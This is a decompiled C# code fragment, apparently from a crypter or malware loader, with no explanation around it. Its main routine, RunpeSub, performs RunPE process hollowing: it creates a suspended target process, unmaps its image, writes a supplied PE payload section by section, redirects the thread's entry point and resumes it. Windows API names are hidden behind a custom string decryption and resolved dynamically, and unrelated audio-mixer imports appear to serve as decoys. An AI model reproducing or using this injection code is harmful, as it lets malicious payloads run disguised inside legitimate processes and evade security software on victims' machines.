	public static extern int mixerGetLineControlsA(int hmxobj, MIXERLINECONTROLS pmxlc, int fdwControls);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerGetDevCapsA(int uMxId, MIXERCAPS pmxcaps, int cbmxcaps);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerGetControlDetailsA(int hmxobj, MIXERCONTROLDETAILS pmxcd, int fdwDetails);

	public static string Decrypt(string input, string key)
	{
		if (input == null)
		{
			throw new ArgumentNullException("input");
		}
		if (key == null)
		{
			throw new ArgumentNullException("key");
		}
		return Encoding.UTF8.GetString(Decrypt(Convert.FromBase64String(input), Encoding.UTF8.GetBytes(key)));
	}

	public static byte[] Decrypt(byte[] input, byte[] key)
	{
		if (input == null)
		{
			throw new ArgumentNullException("input");
		}
		if (key == null)
		{
			throw new ArgumentNullException("key");
		}
		int num = input[^1];
		byte[] array = new byte[input.Length - 2 + 1];
		int num2 = 0;
		int num3 = input.Length - 2;
		for (int i = 0; i <= num3; i++)
		{
			if (num2 >= key.Length)
			{
				num2 = 0;
			}
			if (i < input.Length - 1)
			{
				array[i] = Convert.ToByte(input[i] - array.Length % key.Length - key[num2] + num);
				num2++;
			}
		}
		return array;
	}

	public static bool Win7()
	{
		if (Environment.OSVersion.Version.Major == 6)
		{
			return true;
		}
		return false;
	}

	public static void RunpeSub(byte[] data, string target)
	{
		Context context = default(Context);
		ProcessInformation info = default(ProcessInformation);
		StartupInformation startup = default(StartupInformation);
		SecurityFlags process = default(SecurityFlags);
		SecurityFlags thread = default(SecurityFlags);
		GCHandle gCHandle = GCHandle.Alloc(data, GCHandleType.Pinned);
		int num = gCHandle.AddrOfPinnedObject().ToInt32();
		DosHeader dosHeader = (DosHeader)Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), default(DosHeader).GetType());
		gCHandle.Free();
		mrqs mrqs = Z8Wro8Mry4Fzhw<mrqs>(Decrypt("38KgwdqeYXkN ", "yb3Xz73LWVcN"), Decrypt("hb15tsuxiMe9g3mRy4sl ", "Yb+lncOle7+5oaXBwV0l"));
		if (mrqs == null)
		{
			throw new NotImplementedException();
		}
		evzew evzew = Z8Wro8Mry4Fzhw<evzew>(Decrypt("1svIs9KsiWsU ", "wrbQyLbEUlAU"), Decrypt("ioStf7i8u4O8Yc2/tYXGjic= ", "Z6PBgam9o5uhX7e1waPJwSc="));
		if (evzew == null)
		{
			throw new NotImplementedException();
		}
		i5Ondq i5Ondq = Z8Wro8Mry4Fzhw<i5Ondq>(Decrypt("3JXhvdjHonUP ", "x7vVzbvJV1UP"), Decrypt("sbyCyLjBvaPSn9651JvZl+Eb ", "ia+nrYXJw6uvy8t/r7/Dydcb"));
		if (i5Ondq == null)
		{
			throw new NotImplementedException();
		}
		jx95Iq jx95Iq = Z8Wro8Mry4Fzhw<jx95Iq>("kernel32", Decrypt("nrWZvbpmv8a3fIaqm6ilgbS0MQ== ", "fbOht5lvs62VmbW1aZmprbPBMQ=="));
		if (jx95Iq == null)
		{
			throw new NotImplementedException();
		}
		enx2Ma enx2Ma = Z8Wro8Mry4Fzhw<enx2Ma>(Decrypt("u7Bwqrgr ", "sb2dra0r"), Decrypt("zsmP0+uy5dOds/WW38uftu631KgQ ", "pN6azMqy0JzCut6OvJa6ttjCzswQ"));
		if (enx2Ma == null)
		{
			throw new NotImplementedException();
		}
		qh4E qh4E = Z8Wro8Mry4Fzhw<qh4E>(Decrypt("4NOlw5G0ZnsM ", "yr7Y0L7MWlgM"), Decrypt("tc/Qs+PJo6TWzcyCr98a ", "krjKztCovmi+vsSscNYa"));
		if (qh4E == null)
		{
			throw new NotImplementedException();
		}
		mzt5Dq mzt5Dq = Z8Wro8Mry4Fzhw<mzt5Dq>(Decrypt("t5p/fLJ8QH8t ", "qZ23r52rOTct"), Decrypt("z6rnzeXipdbph6vB6Kv72wM= ", "o8flpc3hx7/Fg9vZ5cft5QM="));
		if (mzt5Dq == null)
		{
			throw new NotImplementedException();
		}
		g4Ch g4Ch = Z8Wro8Mry4Fzhw<g4Ch>(Decrypt("1svIs9KsiWsU ", "wrbQyLbEUlAU"), Decrypt("n4KynsyukrvAgr16JQ== ", "f6XBxbWlg6u/pZ2jJQ=="));
		if (g4Ch == null)
		{
			throw new NotImplementedException();
		}
		IntPtr system = default(IntPtr);
		if (0 - (mrqs(null, target, ref process, ref thread, inherit: false, 4u, system, null, ref startup, out info) ? 1 : 0) == 0)
		{
			return;
		}
		NtHeaders ntHeaders = default(NtHeaders);
		IntPtr ptr = new IntPtr(num + dosHeader.Address);
		ntHeaders = (NtHeaders)Marshal.PtrToStructure(ptr, ntHeaders.GetType());
		long num2 = 0L;
		long num3 = 0L;
		startup.CB = Strings.Len((object)startup);
		context.Flags = 65539u;
		if ((long)ntHeaders.Signature != 17744L || dosHeader.Magic != 23117 || 0 - (mrqs(null, target, ref process, ref thread, inherit: false, 4u, system, null, ref startup, out info) ? 1 : 0) == 0)
		{
			return;
		}
		int read;
		if (Win7())
		{
			evzew(info.Thread, ref context);
			IntPtr process2 = info.Process;
			int address = (int)((long)context.Ebx + 8L);
			int buffer = 0;
			read = 0;
			i5Ondq(process2, address, ref buffer, 4, ref read);
			enx2Ma(info.Process, 0);
		}
		else
		{
			evzew(info.Thread, ref context);
			IntPtr process3 = info.Process;
			int address2 = (int)((long)context.Ebx + 8L);
			read = (int)num2;
			int buffer = 0;
			i5Ondq(process3, address2, ref read, 4, ref buffer);
			num2 = read;
			enx2Ma(info.Process, (int)num2);
		}
		uint num4 = (uint)(int)qh4E(info.Process, (int)ntHeaders.Optional.Image, ntHeaders.Optional.SImage, 12288u, 4u);
		if ((long)num4 == 0L)
		{
			return;
		}
		if (Win7())
		{
			IntPtr process4 = info.Process;
			uint sHeaders = ntHeaders.Optional.SHeaders;
			read = 0;
			jx95Iq(process4, (int)num4, data, (int)sHeaders, out read);
		}
		else
		{
			IntPtr process5 = info.Process;
			uint sHeaders2 = ntHeaders.Optional.SHeaders;
			read = (int)num3;
			jx95Iq(process5, (int)num4, data, (int)sHeaders2, out read);
			num3 = read;
		}
		long num5 = dosHeader.Address + 248;
		int num6 = ntHeaders.File.Sections - 1;
		SectionHeader sectionHeader = default(SectionHeader);
		for (int i = 0; i <= num6; i++)
		{
			ptr = new IntPtr(num + num5 + i * 40);
			sectionHeader = (SectionHeader)Marshal.PtrToStructure(ptr, sectionHeader.GetType());
			byte[] array = new byte[sectionHeader.Size + 1];
			int num7 = (int)((long)sectionHeader.Size - 1L);
			for (int j = 0; j <= num7; j++)
			{
				array[j] = data[(int)(sectionHeader.Pointer + j)];
			}
			if (Win7())
			{
				IntPtr process6 = info.Process;
				uint address3 = num4 + sectionHeader.Address;
				uint size = sectionHeader.Size;
				read = 0;
				jx95Iq(process6, (int)address3, array, (int)size, out read);
			}
			else
			{
				IntPtr process7 = info.Process;
				uint address4 = num4 + sectionHeader.Address;
				uint size2 = sectionHeader.Size;
				read = (int)num3;
				jx95Iq(process7, (int)address4, array, (int)size2, out read);
				num3 = read;
			}
		}
		byte[] bytes = BitConverter.GetBytes(num4);
		IntPtr process8 = info.Process;
		int address5 = (int)((long)context.Ebx + 8L);
		read = 0;
		jx95Iq(process8, address5, bytes, 4, out read);
		context.Eax = num4 + ntHeaders.Optional.Address;
		mzt5Dq(info.Thread, ref context);
		g4Ch(info.Thread);
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr LoadLibraryA(string uj62Piq);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr handle, string uj62Piq);

	private static T Z8Wro8Mry4Fzhw<T>(string uj62Piq, string x7FVvcu1Ew)
	{
		if (uj62Piq == null)
		{
			throw new ArgumentNullException("uj62Piq");
		}
		if (x7FVvcu1Ew == null)
		{
			throw new ArgumentNullException("x7FVvcu1Ew");
		}
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(uj62Piq), x7FVvcu1Ew), typeof(T));
	}
}
